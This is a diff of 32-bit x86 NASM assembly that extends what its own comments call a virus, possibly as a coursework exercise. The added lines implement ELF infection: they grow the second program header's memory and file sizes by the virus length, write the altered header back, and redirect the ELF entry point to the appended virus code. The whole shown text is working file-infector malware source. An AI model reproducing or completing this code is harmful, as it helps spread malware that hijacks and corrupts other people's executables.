@@ -40,6 +40,7 @@
 %define	RDWR	2
 %define	SEEK_END 2
 %define SEEK_SET 0
+%define SEEK_CURR 1
 
 %define ENTRY		24
 %define PHDR_start	28
@@ -186,8 +187,53 @@ _start:
 	sub ecx,PHDR_size
 	read dword[ebp-Local_1_EBP_OFFSET],ecx,PHDR_size; elf header of size 52, 8 bytes from epb already in use
 
+	reset_regs
+    
+    ;secondphdr is starting from 128 down
+    mov ecx,ebp
+    sub ecx,Local_2_EBP_OFFSET
+	sub ecx,ELFHDR_size
+	sub ecx,4
+	sub ecx,PHDR_size
+    sub ecx,PHDR_size 
+	;we are in ebp-96; and we want to put next program header size 32(we didnt reset fd so we are allready in the position of second prog header
+    read dword[ebp-4],ecx,PHDR_size;
+    
+	reset_regs
+          
+    mov ecx,_start;
+    mov edx,virus_end;
+    sub edx,ecx; edx = length of our code
+    
+    add edx,dword[ebp-Local_2_EBP_OFFSET]; edx is now virus size + second original segment size
+    sub edx,dword[ebp-124] ; edx is now new offset with the addition of our virus
+	;modifieng memsize anf filesize
+    mov dword[ebp-128+PHDR_memsize],edx		; updating memsize
+    mov dword[ebp-128+PHDR_filesize], edx	; updating file size 
 
-
+	;; rewrite modified program header	
+ 	mov ebx,-PHDR_size
+    lseek dword[ebp-4],ebx,SEEK_CURR; 
+	;;return to the begining of second program header
+    mov ecx,0
+    mov ecx,ebp
+    sub ecx,128 ;location of our modified second program header
+    write dword[ebp-4],ecx,PHDR_size
+    ;;;;;;;;;;;;
+    reset_regs
+    ;96 first prog header
+    mov ebx,dword[ebp-96+PHDR_vaddr]; loadadress
+    add ebx,dword[ebp-Local_2_EBP_OFFSET]; ebp-8 holding as before original file size(adding to virtadd1 the file orginial size)
+    
+    
+    add ebx,dword[ebp-68]; adding the align which is  is last 4 bytes of begin progheader
+    mov dword[ebp-60+ENTRY],ebx ;entry point position change
+    
+    lseek dword[ebp-Local_1_EBP_OFFSET],0,SEEK_SET; to begin of file des
+    mov ecx,ebp;
+    sub ecx,Local_2_EBP_OFFSET
+	sub ecx,ELFHDR_size
+    write dword[ebp-Local_1_EBP_OFFSET],ecx,ELFHDR_size ;writing the newchanged elfhd to our file
 
 
 	.beforeEnd:	
